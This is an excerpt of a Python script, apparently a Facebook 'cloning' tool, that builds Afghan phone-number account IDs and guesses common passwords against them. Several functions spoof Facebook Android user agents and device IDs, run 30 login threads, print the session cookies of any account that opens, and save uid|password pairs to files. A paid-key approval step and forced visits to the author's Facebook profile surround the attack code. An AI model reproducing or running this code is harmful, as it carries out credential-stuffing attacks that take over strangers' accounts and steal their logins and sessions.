...
try:
	...
	os.system('python HAYA.py')
print('\n\033[1;31m Cheking Server...');time.sleep(3)


print('\n\033[1;32m Please Follow Me');time.sleep(1)
os.system('xdg-open  https://www.facebook.com/profile.php?id=100089543965301 ')
...
def approval():
 ...
 #     print(" Other Countries : 15$ For Monthly")
    #  print('\033[1;37m----------------------------------------------')
 #     print(" Easypaisa  Number     : +9378458760")
  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")
      input('\033[1;37m Press Enter For Contact To Admin ')
      tks = ('Hello%20ZEA%20Sir%20!%20Please%20Approve%20My%20Key%20The%20AFG.PRO%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+93792468624?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;96m[1] RANDOM CLONING m1\n\033[1;95m[2] RANDOM CLONING m2\n\033[1;93m[3] CONTACT BY HAYA \n\033[1;91m[E] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			os.system('xdg-open   https://www.facebook.com/profile.php?id=100089543965301 ')
			if xd in ['1','01']:
...
def awmafghan():
		user=[]
		clear()
		print('\033[1;33m             ,077,070,078,079,076,073')
		...
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mFOLLOW FACEBOOK ACCOUMT')
		os.system('xdg-open  https://www.facebook.com/profile.php?id=100089543965301 ')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		...
		with tred(max_workers=30) as AWM:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'first1234','afghan1234','afghan123','afghanistan','500500','100200','first123','kabul123','Afghan123','firstlast','۱۲۳۴۵۶','khan1234', 'khan123','first12345','khankhan']
				if mthd in ['1','01']:
...
def awmafghan1():
		user=[]
		clear()
		print('\033[1;33m             078,070,077,073,076,079')
		...
		with tred(max_workers=30) as AWM:	
			...
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mRANDOM M1 077 CODE WORK AND RANDOM m2 078Code choice')
			print('\033[1;36m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAYA-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                awm_ua = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2034};FBLC/pl_PL;FBRV/str(random.randint(000000000,999999999));FBCR/MTN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/OPPO A31;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HAYA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [HAYA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                                        print("\r\r\033[1;33m Cookie: "+coki)
                                                        open('/sdcard/HAYA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HAYA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HAYA--OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAYA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                android_version=str(random.randrange(6,13))
                                mirwais = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2133};FBLC/pl_PL;FBRV/str(random.randint(000000000,999999999));FBCR/Etisalat;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/OPPO A31;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [HAYA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/MANSOOR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HAYA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MANSOOR-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
